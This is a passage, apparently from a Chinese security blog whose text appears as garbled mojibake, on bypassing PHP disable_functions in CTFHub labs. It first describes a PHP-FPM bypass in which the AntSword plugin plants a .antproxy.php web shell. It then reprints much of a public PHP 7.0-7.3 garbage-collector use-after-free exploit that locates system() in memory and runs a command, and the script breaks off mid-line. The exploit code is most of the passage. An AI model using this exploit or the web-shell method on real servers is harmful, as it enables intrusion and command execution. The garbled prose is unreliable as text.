fastcgiÁöÑÊï∞ÊçÆÂåÖÂêéÔºåËøõË°åËß£ÊûêÔºåÁÑ∂ÂêéÊâßË°å <code>SCRIPT_FILENAME</code>ÁöÑÂÄºÊåáÂêëÁöÑphpÊñá‰ª∂„ÄÇ<br><a href="https://www.php.cn/faq/455614.html">ËØ¶Ëß£PHP‰∏≠PHP-FPMÊòØ‰ªÄ‰πàÔºüÊúâ‰ªÄ‰πàÁî®Ôºü-phpÊïôÁ®ã-PHP‰∏≠ÊñáÁΩë</a></p><h3 id="Âà©Áî®Êù°‰ª∂-7"><a href="#Âà©Áî®Êù°‰ª∂-7" class="headerlink" title="Âà©Áî®Êù°‰ª∂"></a>Âà©Áî®Êù°‰ª∂</h3><ul><li>Linux Êìç‰ΩúÁ≥ªÁªü</li><li>PHP-FPM</li><li>Â≠òÂú®ÂèØÂÜôÁöÑÁõÆÂΩï, ÈúÄË¶Å‰∏ä‰º† .so Êñá‰ª∂</li></ul><h3 id="Âà©Áî®ÂéüÁêÜ-1"><a href="#Âà©Áî®ÂéüÁêÜ-1" class="headerlink" title="Âà©Áî®ÂéüÁêÜ"></a>Âà©Áî®ÂéüÁêÜ</h3><p>ÂèÇËÄÉ<a href="https://xz.aliyun.com/t/5598#toc-3">ÊµÖÊûêphp-fpmÁöÑÊîªÂáªÊñπÂºè - ÂÖàÁü•Á§æÂå∫ (aliyun.com)</a>ÊÑüËßâÊå∫È∫ªÁÉ¶ÁöÑÔºå‰∏çÊÉ≥Áúã‰∫Ü</p><h3 id="Âà©Áî®ÊñπÊ≥ï-2"><a href="#Âà©Áî®ÊñπÊ≥ï-2" class="headerlink" title="Âà©Áî®ÊñπÊ≥ï"></a>Âà©Áî®ÊñπÊ≥ï</h3><p>ËøôÈáåÊàëÁõ¥Êé•Áî®ctfhub‰∏äÁöÑÁéØÂ¢É‰∫Ü<br>È¶ñÂÖàÊâßË°å‰∏Ä‰∏ãphpinfo()Êü•ÁúãÊòØÂê¶ÈÖçÁΩÆ‰∫Ü<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202312061701130.png" alt="image-20231206170102069"><br>ÂèØ‰ª•ÁúãÂà∞ÈÖçÁΩÆ‰∫Ü<code>FPM/FastCGI</code>ÁÑ∂ÂêéÁõ¥Êé•‰ΩøÁî®Êèí‰ª∂ÁªïËøáÔºåËøô‰∏™Ê®°ÂºèÈúÄË¶ÅËá™Â∑±ÊâæÈÖçÁΩÆÊñá‰ª∂Êü•ÊâæFPMÊé•Âè£Âú∞ÂùÄ<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202312061701985.png" alt="image-20231206170133906"><br>ÈªòËÆ§ÁöÑÊòØ <code>unix:///</code> Êú¨Âú∞ socket ËøôÁßçÁöÑ,Â¶ÇÊûúÈÖçÁΩÆÊàê TCP ÁöÑÈªòËÆ§ÊòØ <code>127.0.0.1:9000</code>Â¶Ç‰∏ãÔºåÈÖçÁΩÆÊñá‰ª∂‰ΩçÁΩÆ‰∏∫&#x2F;usr&#x2F;local&#x2F;etc&#x2F;php-fpm.d&#x2F;zz-docker.conf<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202312061702911.png" alt="image-20231206170202849"><br>ÂºÄÂßãÊâßË°å<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202312061702524.png" alt="image-20231206170215436"><br>ÊàêÂäüÂêéÂèØ‰ª•ÁúãÂà∞ Âú®<code>/var/www/html/</code> ÁõÆÂΩï‰∏ãÊúâ‰∏™ <code>.antproxy.php</code> Êñá‰ª∂<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202312061702871.png" alt="image-20231206170226812"><br>ÁÑ∂ÂêéËøûÊé•Ëøô‰∏™shellÂç≥ÂèØÂëΩ‰ª§ÊâßË°åÔºåÊèí‰ª∂‰∏ä‰º†ÁöÑshellÂØÜÁ†Å‰πüÊòØÊ≤°ÊúâÂèòÁöÑÔºåËøûÊé•‰πãÂêéÂç≥ÂèØÊâßË°åÂëΩ‰ª§<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202312061702352.png" alt="image-20231206170234295"></p><h2 id="Âà©Áî®-GC-UAF"><a href="#Âà©Áî®-GC-UAF" class="headerlink" title="Âà©Áî® GC UAF"></a>Âà©Áî® GC UAF</h2><p>Âà©Áî®ÁöÑÊòØPHP garbage collectorÁ®ãÂ∫è‰∏≠ÁöÑÂ†ÜÊ∫¢Âá∫Ëß¶ÂèëÔºåÂΩ±ÂìçËåÉÂõ¥‰∏∫7.0-1.3<br>Ëøô‰∏™pwnÁöÑ‰πüÂ∞±‰∏çÁ†îÁ©∂‰∫Ü</p><h3 id="Âà©Áî®Êù°‰ª∂-8"><a href="#Âà©Áî®Êù°‰ª∂-8" class="headerlink" title="Âà©Áî®Êù°‰ª∂"></a>Âà©Áî®Êù°‰ª∂</h3><ul><li>Linux Êìç‰ΩúÁ≥ªÁªü</li><li>PHP7.0 - all versions to date</li><li>PHP7.1 - all versions to date</li><li>PHP7.2 - all versions to date</li><li>PHP7.3 - all versions to date</li></ul><h3 id="Âà©Áî®ÊñπÊ≥ï-3"><a href="#Âà©Áî®ÊñπÊ≥ï-3" class="headerlink" title="Âà©Áî®ÊñπÊ≥ï"></a>Âà©Áî®ÊñπÊ≥ï</h3><p>Áõ¥Êé•Áî®ctfhubÁéØÂ¢ÉÔºåÁî®ËöÅÂâëÊèí‰ª∂Êù•ÁªïËøá<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202312061702075.png" alt="image-20231206170249979"><br>‰πüÊúâÁé∞ÊàêÁöÑËÑöÊú¨</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># PHP 7.0-7.3 disable_functions bypass PoC (*nix only)</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># Bug: https://bugs.php.net/bug.php?id=72530</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># This exploit should work on all PHP 7.0-7.3 versions</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># Author: https://github.com/mm0r1</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">pwn</span>(<span class="string">&quot;tac /flag&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">pwn</span>(<span class="params"><span class="variable">$cmd</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">global</span> <span class="variable">$abc</span>, <span class="variable">$helper</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">str2ptr</span>(<span class="params">&amp;<span class="variable">$str</span>, <span class="variable">$p</span> = <span class="number">0</span>, <span class="variable">$s</span> = <span class="number">8</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$address</span> = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$j</span> = <span class="variable">$s</span>-<span class="number">1</span>; <span class="variable">$j</span> &gt;= <span class="number">0</span>; <span class="variable">$j</span>--) &#123;</span><br><span class="line">            <span class="variable">$address</span> &lt;&lt;= <span class="number">8</span>;</span><br><span class="line">            <span class="variable">$address</span> |= <span class="title function_ invoke__">ord</span>(<span class="variable">$str</span>[<span class="variable">$p</span>+<span class="variable">$j</span>]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$address</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">ptr2str</span>(<span class="params"><span class="variable">$ptr</span>, <span class="variable">$m</span> = <span class="number">8</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$out</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="variable">$i</span>=<span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$m</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">            <span class="variable">$out</span> .= <span class="title function_ invoke__">chr</span>(<span class="variable">$ptr</span> &amp; <span class="number">0xff</span>);</span><br><span class="line">            <span class="variable">$ptr</span> &gt;&gt;= <span class="number">8</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$out</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">write</span>(<span class="params">&amp;<span class="variable">$str</span>, <span class="variable">$p</span>, <span class="variable">$v</span>, <span class="variable">$n</span> = <span class="number">8</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$i</span> = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$n</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">            <span class="variable">$str</span>[<span class="variable">$p</span> + <span class="variable">$i</span>] = <span class="title function_ invoke__">chr</span>(<span class="variable">$v</span> &amp; <span class="number">0xff</span>);</span><br><span class="line">            <span class="variable">$v</span> &gt;&gt;= <span class="number">8</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">leak</span>(<span class="params"><span class="variable">$addr</span>, <span class="variable">$p</span> = <span class="number">0</span>, <span class="variable">$s</span> = <span class="number">8</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">global</span> <span class="variable">$abc</span>, <span class="variable">$helper</span>;</span><br><span class="line">        <span class="title function_ invoke__">write</span>(<span class="variable">$abc</span>, <span class="number">0x68</span>, <span class="variable">$addr</span> + <span class="variable">$p</span> - <span class="number">0x10</span>);</span><br><span class="line">        <span class="variable">$leak</span> = <span class="title function_ invoke__">strlen</span>(<span class="variable">$helper</span>-&gt;a);</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$s</span> != <span class="number">8</span>) &#123; <span class="variable">$leak</span> %= <span class="number">2</span> &lt;&lt; (<span class="variable">$s</span> * <span class="number">8</span>) - <span class="number">1</span>; &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$leak</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">parse_elf</span>(<span class="params"><span class="variable">$base</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$e_type</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$base</span>, <span class="number">0x10</span>, <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">        <span class="variable">$e_phoff</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$base</span>, <span class="number">0x20</span>);</span><br><span class="line">        <span class="variable">$e_phentsize</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$base</span>, <span class="number">0x36</span>, <span class="number">2</span>);</span><br><span class="line">        <span class="variable">$e_phnum</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$base</span>, <span class="number">0x38</span>, <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$e_phnum</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">            <span class="variable">$header</span> = <span class="variable">$base</span> + <span class="variable">$e_phoff</span> + <span class="variable">$i</span> * <span class="variable">$e_phentsize</span>;</span><br><span class="line">            <span class="variable">$p_type</span>  = <span class="title function_ invoke__">leak</span>(<span class="variable">$header</span>, <span class="number">0</span>, <span class="number">4</span>);</span><br><span class="line">            <span class="variable">$p_flags</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$header</span>, <span class="number">4</span>, <span class="number">4</span>);</span><br><span class="line">            <span class="variable">$p_vaddr</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$header</span>, <span class="number">0x10</span>);</span><br><span class="line">            <span class="variable">$p_memsz</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$header</span>, <span class="number">0x28</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$p_type</span> == <span class="number">1</span> &amp;&amp; <span class="variable">$p_flags</span> == <span class="number">6</span>) &#123; <span class="comment"># PT_LOAD, PF_Read_Write</span></span><br><span class="line">                <span class="comment"># handle pie</span></span><br><span class="line">                <span class="variable">$data_addr</span> = <span class="variable">$e_type</span> == <span class="number">2</span> ? <span class="variable">$p_vaddr</span> : <span class="variable">$base</span> + <span class="variable">$p_vaddr</span>;</span><br><span class="line">                <span class="variable">$data_size</span> = <span class="variable">$p_memsz</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span>(<span class="variable">$p_type</span> == <span class="number">1</span> &amp;&amp; <span class="variable">$p_flags</span> == <span class="number">5</span>) &#123; <span class="comment"># PT_LOAD, PF_Read_exec</span></span><br><span class="line">                <span class="variable">$text_size</span> = <span class="variable">$p_memsz</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(!<span class="variable">$data_addr</span> || !<span class="variable">$text_size</span> || !<span class="variable">$data_size</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> [<span class="variable">$data_addr</span>, <span class="variable">$text_size</span>, <span class="variable">$data_size</span>];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">get_basic_funcs</span>(<span class="params"><span class="variable">$base</span>, <span class="variable">$elf</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">list</span>(<span class="variable">$data_addr</span>, <span class="variable">$text_size</span>, <span class="variable">$data_size</span>) = <span class="variable">$elf</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$data_size</span> / <span class="number">8</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">            <span class="variable">$leak</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$data_addr</span>, <span class="variable">$i</span> * <span class="number">8</span>);</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$leak</span> - <span class="variable">$base</span> &gt; <span class="number">0</span> &amp;&amp; <span class="variable">$leak</span> - <span class="variable">$base</span> &lt; <span class="variable">$data_addr</span> - <span class="variable">$base</span>) &#123;</span><br><span class="line">                <span class="variable">$deref</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$leak</span>);</span><br><span class="line">                <span class="comment"># &#x27;constant&#x27; constant check</span></span><br><span class="line">                <span class="keyword">if</span>(<span class="variable">$deref</span> != <span class="number">0x746e6174736e6f63</span>)</span><br><span class="line">                    <span class="keyword">continue</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">            <span class="variable">$leak</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$data_addr</span>, (<span class="variable">$i</span> + <span class="number">4</span>) * <span class="number">8</span>);</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$leak</span> - <span class="variable">$base</span> &gt; <span class="number">0</span> &amp;&amp; <span class="variable">$leak</span> - <span class="variable">$base</span> &lt; <span class="variable">$data_addr</span> - <span class="variable">$base</span>) &#123;</span><br><span class="line">                <span class="variable">$deref</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$leak</span>);</span><br><span class="line">                <span class="comment"># &#x27;bin2hex&#x27; constant check</span></span><br><span class="line">                <span class="keyword">if</span>(<span class="variable">$deref</span> != <span class="number">0x786568326e6962</span>)</span><br><span class="line">                    <span class="keyword">continue</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> <span class="variable">$data_addr</span> + <span class="variable">$i</span> * <span class="number">8</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">get_binary_base</span>(<span class="params"><span class="variable">$binary_leak</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$base</span> = <span class="number">0</span>;</span><br><span class="line">        <span class="variable">$start</span> = <span class="variable">$binary_leak</span> &amp; <span class="number">0xfffffffffffff000</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="number">0x1000</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">            <span class="variable">$addr</span> = <span class="variable">$start</span> - <span class="number">0x1000</span> * <span class="variable">$i</span>;</span><br><span class="line">            <span class="variable">$leak</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$addr</span>, <span class="number">0</span>, <span class="number">7</span>);</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$leak</span> == <span class="number">0x10102464c457f</span>) &#123; <span class="comment"># ELF header</span></span><br><span class="line">                <span class="keyword">return</span> <span class="variable">$addr</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">get_system</span>(<span class="params"><span class="variable">$basic_funcs</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$addr</span> = <span class="variable">$basic_funcs</span>;</span><br><span class="line">        <span class="keyword">do</span> &#123;</span><br><span class="line">            <span class="variable">$f_entry</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$addr</span>);</span><br><span class="line">            <span class="variable">$f_name</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$f_entry</span>, <span class="number">0</span>, <span class="number">6</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$f_name</span> == <span class="number">0x6d6574737973</span>) &#123; <span class="comment"># system</span></span><br><span class="line">                <span class="keyword">return</span> <span class="title function_ invoke__">leak</span>(<span class="variable">$addr</span> + <span class="number">8</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="variable">$addr</span> += <span class="number">0x20</span>;</span><br><span class="line">        &#125; <span class="keyword">while</span>(<span class="variable">$f_entry</span> != <span class="number">0</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">ryat</span> </span>&#123;</span><br><span class="line">        <span class="keyword">var</span> <span class="variable">$ryat</span>;</span><br><span class="line">        <span class="keyword">var</span> <span class="variable">$chtg</span>;</span><br><span class="line">        </span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;chtg = <span class="variable language_">$this</span>-&gt;ryat;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;ryat = <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Helper</span> </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$a</span>, <span class="variable">$b</span>, <span class="variable">$c</span>, <span class="variable">$d</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">stristr</span>(PHP_OS, <span class="string">&#x27;WIN&#x27;</span>)) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;This PoC is for *nix systems only.&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$n_alloc</span> = <span class="number">10</span>; <span class="comment"># increase this value if you get segfaults</span></span><br><span class="line"></span><br><span class="line">    <span class="variable">$contiguous</span> = [];</span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$n_alloc</span>; <span class="variable">$i</span>++)</span><br><span class="line">        <span class="variable">$contiguous</span>[] = <span class="title function_ invoke__">str_repeat</span>(<span class="string">&#x27;A&#x27;</span>, <span class="number">79</span>);</span><br><span class="line"></span><br><span class="line">    <span class="variable">$poc</span> = <span class="string">&#x27;a:4:&#123;i:0;i:1;i:1;a:1:&#123;i:0;O:4:&quot;ryat&quot;:2:&#123;s:4:&quot;ryat&quot;;R:3;s:4:&quot;chtg&quot;;i:2;&#125;&#125;i:1;i:3;i:2;R:5;&#125;&#x27;</span>;</span><br><span class="line">    <span class="variable">$out</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$poc</span>);</span><br><span class="line">    <span class="title function_ invoke__">gc_collect_cycles</span>();</span><br><span class="line"></span><br><span class="line">    <span class="variable">$v</span> = [];</span><br><span class="line">    <span class="variable">$v</span>[<span class="number">0</span>] = <span class="title function_ invoke__">ptr2str</span>(<span class="number">0</span>, <span class="number">79</span>);</span><br><span class="line">    <span class="keyword">unset</span>(<span class="variable">$v</span>);</span><br><span class="line">    <span class="variable">$abc</span> = <span class="variable">$out</span>[<span class="number">2</span>][<span class="number">0</span>];</span><br><span class="line"></span><br><span class="line">    <span class="variable">$helper</span> = <span class="keyword">new</span> <span class="title class_">Helper</span>;</span><br><span class="line">    <span class="variable">$helper</span>-&gt;b = <span class="function"><span class="keyword">function</span> (<span class="params"><span class="variable">$x</span></span>) </span>&#123; &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">strlen</span>(<span class="variable">$abc</span>) == <span class="number">79</span> || <span class="title function_ invoke__">strlen</span>(<span class="variable">$abc</span>) == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;UAF failed&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment"># leaks</span></span><br><span class="line">    <span class="variable">$closure_handlers</span> = <span class="title function_ invoke__">str2ptr</span>(<span class="variable">$abc</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="variable">$php_heap</span> = <span class="title function_ invoke__">str2ptr</span>(<span class="variable">$abc</span>, <span class="number">0x58</span>);</span><br><span class="line">    <span class="variable">$abc_addr</span> = <span class="variable">$php_heap</span> - <span class="number">0xc8</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment"># fake value</span></span><br><span class="line">    <span class="title function_ invoke__">write</span>(<span class="variable">$abc</span>, <span class="number">0x60</span>, <span class="number">2</span>);</span><br><span class="line">    <span class="title function_ invoke__">write</span>(<span class="variable">$abc</span>, <span class="number">0x70</span>, <span class="number">6</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment"># fake reference</span></span><br><span class="line">    <span class="title function_ invoke__">write</span>(<span class="variable">$abc</span>, <span class="number">0x10</span>, <span class="variable">$abc_addr</span> + <span class="number">0x60</span>);</span><br><span class="line">    <span class="title function_ invoke__">write</span>(<span class="variable">$abc</span>, <span class="number">0x18</span>, <span class="number">0xa</span>);</span><br><span class="line"></span><br><span class="line">    <span class="variable">$closure_obj</span> = <span class="title function_ invoke__">str2ptr</span>(<span class="variable">$abc</span>, <span class="number">0x20</span>);</span><br><span class="line"></span><br><span class="line">    <span class="variable">$binary_leak</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$closure_handlers</span>, <span class="number">8</span>);</span><br><span class="line">    <span class="keyword">if</span>(!(<span class="variable">$base</span> = <span class="title function_ invoke__">get_binary_base</span>(<span class="variable">$binary_leak</span>))) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Couldn&#x27;t determine binary base address&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!(<span class="variable">$elf</span> = <span class="title function_ invoke__">parse_elf</span>(<span class="variable">$base</span>))) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Couldn&#x27;t parse ELF header&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!(<span class="variable">$basic_funcs</span> = <span class="title function_ invoke__">get_basic_funcs</span>(<span class="variable">$base</span>, <span class="variable">$elf</span>))) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Couldn&#x27;t get basic_functions address&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!(<span class="variable">$zif_system</span> = <span class="title function_ invoke__">get_system</span>(<span class="variable">$basic_funcs</span>))) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Couldn&#x27;t get zif_system address&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment"># fake closure object</span></span><br><span class="line">    <span class="variable">$fake_obj_offset</span> = <span 